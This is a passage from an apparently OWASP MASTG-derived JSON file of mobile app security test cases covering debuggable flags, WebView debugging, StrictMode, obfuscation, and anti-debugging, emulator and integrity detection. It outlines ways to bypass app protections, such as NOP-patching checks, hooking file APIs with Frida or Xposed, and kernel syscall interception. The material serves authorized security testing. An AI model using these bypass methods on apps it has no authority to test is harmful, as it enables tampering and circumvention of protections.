engineering tools:</p><ol><li>Patch the anti reverse engineering functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.</li><li>Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file, not the modified file.</li><li>Use a kernel module to intercept file-related system calls. When the process attempts to open the modified file, return a file descriptor for the unmodified version of the file.</li></ol>",
        "code": "MASTG-TEST-0048",
        "sort_order": 112
    },
    {
        "tags":
        [
            "MASTG-TEST-0227: Debugging Enabled for WebViews"
        ],
        "testcase": "Debugging Enabled for WebViews",
        "details": "<h2>Overview</h2><p>The WebView.setWebContentsDebuggingEnabled(true) API enables debugging for <strong>all</strong> WebViews in the application. This feature can be useful during development, but introduces significant security risks if left enabled in production. When enabled, a connected PC can debug, eavesdrop, or modify communication within any WebView in the application. See the <a href=\"https://developer.chrome.com/docs/devtools/remote-debugging/webviews/#configure_webviews_for_debugging\" rel=\"noopener noreferrer\" target=\"_blank\">\"Android Documentation\" ↗</a> for more details.</p><p>Note that this flag works independently of the debuggable attribute in the AndroidManifest.xml (see <em><a href=\"https://mas.owasp.org/MASTG-TEST-0226\" rel=\"noopener noreferrer\" target=\"_blank\"> Debuggable Flag Enabled in the AndroidManifest</a></em>). Even if the app is not marked as debuggable, the WebViews can still be debugged by calling this API.</p><h2></h2><h2>Steps</h2><ol><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em> with a tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> on the app binary and look for uses of:<ul><li>WebView.setWebContentsDebuggingEnabled being set to true.</li><li>ApplicationInfo.FLAG_DEBUGGABLE.</li></ul></li></ol><h2></h2><h2>Observation</h2><p>The output should list:</p><ul><li>All locations where WebView.setWebContentsDebuggingEnabled is called with true at runtime.</li><li>Any references to ApplicationInfo.FLAG_DEBUGGABLE.</li></ul><h2></h2><h2>Evaluation</h2><p>The test case fails if WebView.setWebContentsDebuggingEnabled(true) is called unconditionally or in contexts where the ApplicationInfo.FLAG_DEBUGGABLE flag is not checked.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0008\" rel=\"noopener noreferrer\" target=\"_blank\"> Debugging Disabled for WebViews</a></em></li></ul>",
        "code": "MASTG-TEST-0227",
        "sort_order": 119
    },
    {
        "tags":
        [
            "MASTG-TEST-0051: Testing Obfuscation"
        ],
        "testcase": "Testing Obfuscation",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Decompile the APK (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>) and review it (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>) to determine whether the codebase has been obfuscated.</p><p>Below you can find a sample for an obfuscated code block:</p><pre>package com.a.a.a;\nimport com.a.a.b.a;\nimport java.util.List;\nclass a$b\n  extends a\n{\n  public a$b(List paramList)\n  {\n    super(paramList);\n  }\n  public boolean areAllItemsEnabled()\n  {\n    return true;\n  }\n  public boolean isEnabled(int paramInt)\n  {\n    return true;\n  }\n}\n</pre><p>Here are some considerations:</p><ul><li>Meaningful identifiers, such as class names, method names, and variable names, might have been discarded.</li><li>String resources and strings in binaries might have been encrypted.</li><li>Code and data related to the protected functionality might be encrypted, packed, or otherwise concealed.</li></ul><p>For native code:</p><ul><li><a href=\"https://man7.org/linux/man-pages/dir_section_3.html\" rel=\"noopener noreferrer\" target=\"_blank\">libc APIs ↗</a> (e.g open, read) might have been replaced with OS <a href=\"https://man7.org/linux/man-pages/man2/syscalls.2.html\" rel=\"noopener noreferrer\" target=\"_blank\">syscalls ↗</a>.</li><li><a href=\"https://github.com/obfuscator-llvm/obfuscator\" rel=\"noopener noreferrer\" target=\"_blank\">Obfuscator-LLVM ↗</a> might have been applied to perform <a href=\"https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening\" rel=\"noopener noreferrer\" target=\"_blank\">\"Control Flow Flattening\" ↗</a> or <a href=\"https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow\" rel=\"noopener noreferrer\" target=\"_blank\">\"Bogus Control Flow\" ↗</a>.</li></ul><p>Some of these techniques are discussed and analyzed in the blog post <a href=\"https://darvincitech.wordpress.com/2020/01/07/security-hardening-of-android-native-code/\" rel=\"noopener noreferrer\" target=\"_blank\">\"Security hardening of Android native code\" ↗</a> by Gautam Arvind and in the <a href=\"https://github.com/enovella/cve-bio-enovella/blob/master/slides/APKiD-NowSecure-Connect19-enovella.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">\"APKiD: Fast Identification of AppShielding Products\" ↗</a> presentation by Eduardo Novella.</p><p>For a more detailed assessment, you need a detailed understanding of the relevant threats and the obfuscation methods used. Tools such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0009\" rel=\"noopener noreferrer\" target=\"_blank\"> APKiD</a></em> may give you additional indications about which techniques were used for the target app such as obfuscators, packers and anti-debug measures.</p><h2></h2><h2>Dynamic Analysis</h2><p>You can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0009\" rel=\"noopener noreferrer\" target=\"_blank\"> APKiD</a></em> to detect if the app has been obfuscated.</p><p>Example using the <em><a href=\"https://mas.owasp.org/MASTG-APP-0015\" rel=\"noopener noreferrer\" target=\"_blank\"> Android UnCrackable L4</a></em>:</p><pre>apkid mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk\n[+] APKiD 2.1.2 :: from RedNaga :: rednaga.io\n[*] mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk!classes.dex\n |-&gt; anti_vm : Build.TAGS check, possible ro.secure check\n |-&gt; compiler : r8\n |-&gt; obfuscator : unreadable field names, unreadable method names\n</pre><p>In this case it detects that the app has unreadable field names and method names, among other things.</p>",
        "code": "MASTG-TEST-0051",
        "sort_order": 115
    },
    {
        "tags":
        [
            "MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest"
        ],
        "testcase": "Debuggable Flag Enabled in the AndroidManifest",
        "details": "<h2>Overview</h2><p>This test case checks if the app has the debuggable flag (<a href=\"https://developer.android.com/guide/topics/manifest/application-element#debug\" rel=\"noopener noreferrer\" target=\"_blank\">android:debuggable ↗</a>) set to true in the AndroidManifest.xml. When this flag is enabled, it allows the app to be debugged enabling attackers to inspect the app's internals, bypass security controls, or manipulate runtime behavior.</p><p>Although having the debuggable flag set to true <a href=\"https://developer.android.com/privacy-and-security/risks/android-debuggable\" rel=\"noopener noreferrer\" target=\"_blank\">is not considered a direct vulnerability ↗</a>, it significantly increases the attack surface by providing unauthorized access to app data and resources, particularly in production environments.</p><h2></h2><h2>Steps</h2><ol><li>Obtain the AndroidManifest.xml file using <em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>.</li><li>Search for the debuggable flag:<ul><li>Look for android:debuggable if analyzing raw XML using tools like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Apktool</a></em>.</li><li>Look for application-debuggable if using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0124\" rel=\"noopener noreferrer\" target=\"_blank\"> aapt2</a></em>.</li></ul></li></ol><h2></h2><h2>Observation</h2><p>The output should explicitly show whether the debuggable flag is set (true or false). If the flag is not specified, it is treated as false by default for release builds.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if the debuggable flag is explicitly set to true. This indicates that the app is configured to allow debugging, which is inappropriate for production environments.</p><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0007\" rel=\"noopener noreferrer\" target=\"_blank\"> Debuggable Flag Disabled in the AndroidManifest</a></em></li></ul>",
        "code": "MASTG-TEST-0226",
        "sort_order": 118
    },
    {
        "tags":
        [
            "MASTG-TEST-0263: Logging of StrictMode Violations"
        ],
        "testcase": "Logging of StrictMode Violations",
        "details": "<h2>Overview</h2><p>This test checks whether an app enables <a href=\"https://mas.owasp.org/MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/#strictmode\" rel=\"noopener noreferrer\" target=\"_blank\">StrictMode</a> in production. While useful for developers to log policy violations such as disk I/O or network operations in production apps, leaving StrictMode enabled can expose sensitive implementation details in the logs that could be exploited by attackers.</p><h2></h2><h2>Steps</h2><ol><li>Install the production build of your app on your device or emulator.</li><li>Uses <em><a href=\"https://mas.owasp.org/MASTG-TECH-0009\" rel=\"noopener noreferrer\" target=\"_blank\"> Monitoring System Logs</a></em> to show the system logs StrictMode creates.</li><li>Open the app and let it execute.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of log statements related to StrictMode.</p><h2></h2><h2>Evaluation</h2><p>The test fails if an app logs any StrictMode policy violations.</p>",
        "code": "MASTG-TEST-0263",
        "sort_order": 122
    },
    {
        "tags":
        [
            "MASTG-TEST-0264: Runtime Use of StrictMode APIs"
        ],
        "testcase": "Runtime Use of StrictMode APIs",
        "details": "<h2>Overview</h2><p>This test checks whether the app uses StrictMode by dynamically analyzing the app's behavior and placing relevant hooks to detect the use of StrictMode APIs, such as StrictMode.setVmPolicy and StrictMode.VmPolicy.Builder.penaltyLog.</p><p>While StrictMode is useful for developers to log policy violations such as disk I/O or network operations during development, it can expose sensitive implementation details in the logs that could be exploited by attackers.</p><h2></h2><h2>Steps</h2><ol><li>Use runtime method hooking (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0043\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Hooking</a></em>) and look for uses of StrictMode APIs.</li></ol><h2></h2><h2>Observation</h2><p>The output should show the runtime usage of StrictMode APIs.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the Frida script output shows the runtime usage of StrictMode APIs.</p>",
        "code": "MASTG-TEST-0264",
        "sort_order": 123
    },
    {
        "tags":
        [],
        "testcase": "Debugging Symbols in Native Binaries",
        "details": "<h2>Overview</h2><p>This test checks whether the app includes debugging symbols in its native binaries. Debugging symbols can provide valuable information during reverse engineering and vulnerability analysis by exposing sensitive implementation details such as function names, variable names, and source file references.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0140\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Debugging Information and Symbols</a></em>) to retrieve any debugging information present in the native binaries.</li></ol><h2></h2><h2>Observation</h2><p>The output should identify all instances of debugging information in the native binaries.</p><h2></h2><h2>Evaluation</h2><p>The test <strong>fails</strong> if debugging information is present in any native binary, including if actual debugging symbols were successfully extracted.</p>",
        "code": "MASTG-TEST-0288",
        "sort_order": 125
    },
    {
        "tags":
        [
            "MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging"
        ],
        "testcase": "Testing for Debugging Code and Verbose Error Logging",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>You can take the following static analysis approach for the logging statements:</p><ol><li>Import the application's code into Xcode.</li><li>Search the code for the following printing functions: NSLog, println, print, dump, debugPrint.</li><li>When you find one of them, determine whether the developers used a wrapping function around the logging function for better mark up of the statements to be logged; if so, add that function to your search.</li><li>For every result of steps 2 and 3, determine whether macros or debug-state related guards have been set to turn the logging off in the release build. Please note the change in how Objective-C can use preprocessor macros:</li></ol><pre>#ifdef DEBUG\n    // Debug-only code\n#endif\n</pre><p>The procedure for enabling this behavior in Swift has changed: you need to either set environment variables in your scheme or set them as custom flags in the target's build settings. Please note that the following functions (which allow you to determine whether the app was built in the Swift 2.1. release-configuration) aren't recommended, as Xcode 8 and Swift 3 don't support these functions:</p><ul><li>_isDebugAssertConfiguration</li><li>_isReleaseAssertConfiguration</li><li>_isFastAssertConfiguration.</li></ul><p>Depending on the application's setup, there may be more logging functions. For example, when <a href=\"https://github.com/CocoaLumberjack/CocoaLumberjack\" rel=\"noopener noreferrer\" target=\"_blank\">CocoaLumberjack ↗</a> is used, static analysis is a bit different.</p><p>For the \"debug-management\" code (which is built-in): inspect the storyboards to see whether there are any flows and/or view-controllers that provide functionality different from the functionality the application should support. This functionality can be anything from debug views to printed error messages, from custom stub-response configurations to logs written to files on the application's file system or a remote server.</p><p>As a developer, incorporating debug statements into your application's debug version should not be a problem as long as you make sure that the debug statements are never present in the application's release version.</p><p>In Objective-C, developers can use preprocessor macros to filter out debug code:</p><pre>#ifdef DEBUG\n    // Debug-only code\n#endif\n</pre><p>In Swift 2 (with Xcode 7), you have to set custom compiler flags for every target, and compiler flags have to start with \"-D\". So you can use the following annotations when the debug flag DMSTG-DEBUG is set:</p><pre>#if MSTG_DEBUG\n    // Debug-only code\n#endif\n</pre><p>In Swift 3 (with Xcode 8), you can set Active Compilation Conditions in Build settings/Swift compiler - Custom flags. Instead of a preprocessor, Swift 3 uses <a href=\"https://developer.apple.com/library/content/documentation/Swift/Conceptual/BuildingCocoaApps/InteractingWithCAPIs.html#//apple_ref/doc/uid/TP40014216-CH8-ID34\" rel=\"noopener noreferrer\" target=\"_blank\">conditional compilation blocks ↗</a> based on the defined conditions:</p><pre>#if DEBUG_LOGGING\n    // Debug-only code\n#endif\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>Dynamic analysis should be executed on both a simulator and a device because developers sometimes use target-based functions (instead of functions based on a release/debug-mode) to execute the debugging code.</p><ol><li>Run the application on a simulator and check for output in the console during the app's execution.</li><li>Attach a device to your Mac, run the application on the device via Xcode, and check for output in the console during the app's execution.</li></ol><p>For the other \"manager-based\" debug code: click through the application on both a simulator and a device to see if you can find any functionality that allows an app's profiles to be pre-set, allows the actual server to be selected or allows responses from the API to be selected.</p>",
        "code": "MASTG-TEST-0084",
        "sort_order": 126
    },
    {
        "tags":
        [
            "MASTG-TEST-0092: Testing Emulator Detection"
        ],
        "testcase": "Testing Emulator Detection",
        "details": "<h2>Overview</h2><p>In order to test for emulator detection you can try to run the app on different emulators as indicated in section <a href=\"https://mas.owasp.org/MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#emulator-detection\" rel=\"noopener noreferrer\" target=\"_blank\">\"Emulator Detection\"</a> and see what happens.</p><p>The app should respond in some way. For example by:</p><ul><li>Alerting the user and asking for accepting liability.</li><li>Preventing execution by gracefully terminating.</li><li>Reporting to a backend server, e.g, for fraud detection.</li></ul><p>You can also reverse engineer the app using ideas for strings and methods from section <a href=\"https://mas.owasp.org/MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#emulator-detection\" rel=\"noopener noreferrer\" target=\"_blank\">\"Emulator Detection\"</a>.</p><p>Next, work on bypassing this detection and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the detection code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul>",
        "code": "MASTG-TEST-0092",
        "sort_order": 130
    },
    {
        "tags":
        [
            "MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs"
        ],
        "testcase": "Runtime Use of Secure Screen Lock Detection APIs",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0247\" rel=\"noopener noreferrer\" target=\"_blank\"> References to APIs for Detecting Secure Screen Lock</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Run a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em> and look for uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>",
        "code": "MASTG-TEST-0249",
        "sort_order": 121
    },
    {
        "tags":
        [
            "MASTG-TEST-0265: References to StrictMode APIs"
        ],
        "testcase": "References to StrictMode APIs",
        "details": "<h2>Overview</h2><p>This test checks whether the app uses StrictMode. While useful for developers to log policy violations such as disk I/O or network operations during development, it can expose sensitive implementation details in the logs that could be exploited by attackers.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool to identify all instances of StrictMode APIs.</li></ol><h2></h2><h2>Observation</h2><p>The output should identify all instances of StrictMode usage in the app.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses StrictMode APIs.</p>",
        "code": "MASTG-TEST-0265",
        "sort_order": 124
    },
    {
        "tags":
        [
            "MASTG-TEST-0090: Testing File Integrity Checks"
        ],
        "testcase": "Testing File Integrity Checks",
        "details": "<h2>Overview</h2><p><strong>Application Source Code Integrity Checks:</strong></p><p>Run the app on the device in an unmodified state and make sure that everything works. Then apply some patches to the executable (e.g. see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0090\" rel=\"noopener noreferrer\" target=\"_blank\"> Injecting Frida Gadget into an IPA Automatically</a></em>), re-sign the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0092\" rel=\"noopener noreferrer\" target=\"_blank\"> Signing IPA files</a></em>), and run it.</p><p>The app should respond in some way. For example by:</p><ul><li>Alerting the user and asking for accepting liability.</li><li>Preventing execution by gracefully terminating.</li><li>Securely wiping any sensitive data stored on the device.</li><li>Reporting to a backend server, e.g, for fraud detection.</li></ul><p>Work on bypassing the defenses and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the detection code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul><p><strong>File Storage Integrity Checks:</strong></p><p>Go to the app data directories as indicated in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0059\" rel=\"noopener noreferrer\" target=\"_blank\"> Accessing App Data Directories</a></em> and modify some files.</p><p>Next, work on bypassing the defenses and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by changing the contents of a file or a key-value pair)?</li><li>How difficult is obtaining the HMAC key or the asymmetric private key?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul>",
        "code": "MASTG-TEST-0090",
        "sort_order": 128
    },
    {
        "tags":
        [
            "MASTG-TEST-0091: Testing Reverse Engineering Tools Detection"
        ],
        "testcase": "Testing Reverse Engineering Tools Detection",
        "details": "<h2>Overview</h2><p>Launch the app with various reverse engineering tools and frameworks installed on your test device, such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0031\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida</a></em>, <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0139\" rel=\"noopener noreferrer\" target=\"_blank\"> ElleKit</a></em>, or <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0066\" rel=\"noopener noreferrer\" target=\"_blank\"> SSL Kill Switch 3</a></em>.</p><p>The app should respond in some way to the presence of those tools. For example by:</p><ul><li>Alerting the user and asking for accepting liability.</li><li>Preventing execution by gracefully terminating.</li><li>Securely wiping any sensitive data stored on the device.</li><li>Reporting to a backend server, e.g, for fraud detection.</li></ul><p>Next, work on bypassing the detection of the reverse engineering tools and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the detection code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul>",
        "code": "MASTG-TEST-0091",
        "sort_order": 129
    },
    {
        "tags":
        [
            "MASTG-TEST-0089: Testing Anti-Debugging Detection"
        ],
        "testcase": "Testing Anti-Debugging Detection",
        "details": "<h2>Overview</h2><p>In order to test for anti-debugging detection you can try to attach a debugger to the app and see what happens.</p><p>The app should respond in some way. For example by:</p><ul><li>Alerting the user and asking for accepting liability.</li><li>Preventing execution by gracefully terminating.</li><li>Securely wiping any sensitive data stored on the device.</li><li>Reporting to a backend server, e.g, for fraud detection.</li></ul><p>Try to hook or reverse engineer the app using the methods from section <a href=\"https://mas.owasp.org/MASTG/0x05j-Testing-Resiliency-Against-Reverse-Engineering/#anti-debugging\" rel=\"noopener noreferrer\" target=\"_blank\">\"Anti-Debugging Detection\"</a>.</p><p>Next, work on bypassing the detection and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the detection code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul>",
        "code": "MASTG-TEST-0089",
        "sort_order": 127
    },
    {
        "tags":
        [
            "MASTG-TEST-0220: Usage of Outdated Code Signature Format"
        ],
        "testcase": "Usage of Outdated Code Signature Format",
        "details": "<h2>Overview</h2><p>On iOS, code signatures verify the integrity and authenticity of an app's binary, preventing unauthorized modifications and ensuring that the app is trusted by the operating system. Apple regularly updates its <a href=\"https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format\" rel=\"noopener noreferrer\" target=\"_blank\">code signature formats ↗</a> to enhance cryptographic strength and improve protection against tampering.</p><p>Using an outdated code signature format may expose the app to security risks, as older formats may lack support for current cryptographic standards and may be more vulnerable to manipulation. Adopting the latest code signature format helps maintain app integrity and ensures compatibility with the latest security features in iOS.</p><h2></h2><h2>Steps</h2><ol><li>Extract the package as described in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0058\" rel=\"noopener noreferrer\" target=\"_blank\"> Exploring the App Package</a></em>.</li><li>Obtain the version of the code signature format as described in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0112\" rel=\"noopener noreferrer\" target=\"_blank\"> Reverse Engineering Flutter Applications</a></em>.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the version of the code signature format.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the version is below the <a href=\"https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format\" rel=\"noopener noreferrer\" target=\"_blank\">recommended one ↗</a>.</p><p>Ensure that the app is using the <a href=\"https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format\" rel=\"noopener noreferrer\" target=\"_blank\">latest code signing format ↗</a>. You can retrieve the signing certificate format with <em><a href=\"https://mas.owasp.org/MASTG-TECH-0112\" rel=\"noopener noreferrer\" target=\"_blank\"> Reverse Engineering Flutter Applications</a></em>. This will ensure that the integrity of the app is protected according to the latest cryptographic standards, preventing tampering with the app binary and ensuring that the unmodified copy is distributed to users.</p>",
        "code": "MASTG-TEST-0220",
        "sort_order": 133
    },
    {
        "tags":
        [
            "MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist"
        ],
        "testcase": "Debuggable Entitlement Enabled in the entitlements.plist",
        "details": "<h2>Overview</h2><p>The test evaluates whether an iOS application is configured to allow debugging. If an app is debuggable, attackers can leverage debugging tools (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0084\" rel=\"noopener noreferrer\" target=\"_blank\"> Debugging</a></em>) to analyse the runtime behaviour of the app, and potentially compromise sensitive data or functionality.</p><h2></h2><h2>Steps</h2><ol><li>Use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0111\" rel=\"noopener noreferrer\" target=\"_blank\"> Extracting Entitlements from MachO Binaries</a></em> to extract entitlements from the binary.</li><li>Search for the get-task-allow key.</li></ol><h2></h2><h2>Observation</h2><p>The output contains the value of the get-task-allow entitlement.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the get-task-allow entitlement is true.</p>",
        "code": "MASTG-TEST-0261",
        "sort_order": 138
    },
    {
        "tags":
        [
            "MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs"
        ],
        "testcase": "Runtime Use of Secure Screen Lock Detection APIs",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0248\" rel=\"noopener noreferrer\" target=\"_blank\"> References to APIs for Detecting Secure Screen Lock</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Run a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em> and look for uses of <a href=\"https://developer.apple.com/documentation/localauthentication/lacontext/canevaluatepolicy(_:error:)\" rel=\"noopener noreferrer\" target=\"_blank\">LAContext.canEvaluatePolicy(.deviceOwnerAuthentication) ↗</a> API or data stored with <a href=\"https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly ↗</a> attribute.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>",
        "code": "MASTG-TEST-0246",
        "sort_order": 136
    },
    {
        "tags":
        [
            "MASTG-TEST-0093: Testing Obfuscation"
        ],
        "testcase": "Testing Obfuscation",
        "details": "<h2>Overview</h2><p>Attempt to disassemble the Mach-O in the IPA and any included library files in the \"Frameworks\" directory (.dylib or .framework files), and perform static analysis. At the very least, the app's core functionality (i.e., the functionality meant to be obfuscated) shouldn't be easily discerned. Verify that:</p><ul><li>meaningful identifiers, such as class names, method names, and variable names, have been discarded.</li><li>string resources and strings in binaries are encrypted.</li><li>code and data related to the protected functionality is encrypted, packed, or otherwise concealed.</li></ul><p>For a more detailed assessment, you need a detailed understanding of the relevant threats and the obfuscation methods used.</p>",
        "code": "MASTG-TEST-0093",
        "sort_order": 131
    },
    {
        "tags":
        [
            "MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock"
        ],
        "testcase": "References to APIs for Detecting Secure Screen Lock",
        "details": "<h2>Overview</h2><p>This test verifies that an app is running on a device with a secure <a href=\"https://support.apple.com/en-us/guide/iphone/iph14a867ae/ios\" rel=\"noopener noreferrer\" target=\"_blank\">screen lock (e.g. a passcode) ↗</a>.</p><p>On iOS, apps can determine whether a secure screen lock is set using the <strong>LocalAuthentication</strong> framework. Specifically, the <a href=\"https://developer.apple.com/documentation/localauthentication/lacontext/canevaluatepolicy(_:error:)\" rel=\"noopener noreferrer\" target=\"_blank\">LAContext.canEvaluatePolicy(_:error:) ↗</a> method with the <a href=\"https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthentication\" rel=\"noopener noreferrer\" target=\"_blank\">.deviceOwnerAuthentication ↗</a> or <a href=\"https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthenticationwithbiometrics\" rel=\"noopener noreferrer\" target=\"_blank\">.deviceOwnerAuthenticationWithBiometrics ↗</a> policy can be used to check if authentication mechanisms, including a passcode, are available.</p><p>Apps leveraging the <strong>Keychain Services API</strong> can require passcode authentication before accessing sensitive data using the <a href=\"https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly ↗</a> attribute.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary and look for uses of <a href=\"https://developer.apple.com/documentation/localauthentication/lacontext/canevaluatepolicy(_:error:)\" rel=\"noopener noreferrer\" target=\"_blank\">LAContext.canEvaluatePolicy(.deviceOwnerAuthentication) ↗</a> API, or data stored with <a href=\"https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly ↗</a> attribute.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>",
        "code": "MASTG-TEST-0248",
        "sort_order": 137
    },
    {
        "tags":
        [
            "MASTG-TEST-0219: Testing for Debugging Symbols"
        ],
        "testcase": "Testing for Debugging Symbols",
        "details": "<h2>Overview</h2><p>This test case checks for <a href=\"https://mas.owasp.org/MASWE/MASVS-RESILIENCE/MASWE-0093/\" rel=\"noopener noreferrer\" target=\"_blank\">debugging symbols</a> in all binaries contained in the app.</p><p>Debugging symbols are added by the <a href=\"https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information\" rel=\"noopener noreferrer\" target=\"_blank\">compiler to ease development ↗</a> and allow symbolication of crashes. However, they can also be used to reverse engineer the app and should not be present in a released app. <a href=\"https://developer.apple.com/documentation/xcode/adding-identifiable-symbol-names-to-a-crash-report\" rel=\"noopener noreferrer\" target=\"_blank\">Symbolication can also be performed ↗</a> with a separate dSYM file.</p><p>To manage debugging symbols in Xcode, developers can adjust the following build settings:</p><ul><li><strong>Generate Debug Symbols</strong>: Xcode adds debugging symbols if the setting <a href=\"https://developer.apple.com/documentation/xcode/build-settings-reference#Generate-Debug-Symbols\" rel=\"noopener noreferrer\" target=\"_blank\">\"Build Settings\" &gt; \"Apple Clang - Code Generation\" &gt; \"Generate Debug Symbols\" ↗</a> is set to \"Yes\".</li><li><strong>Debug Information Format</strong>: Found under <a href=\"https://developer.apple.com/documentation/xcode/build-settings-reference#Debug-Information-Format\" rel=\"noopener noreferrer\" 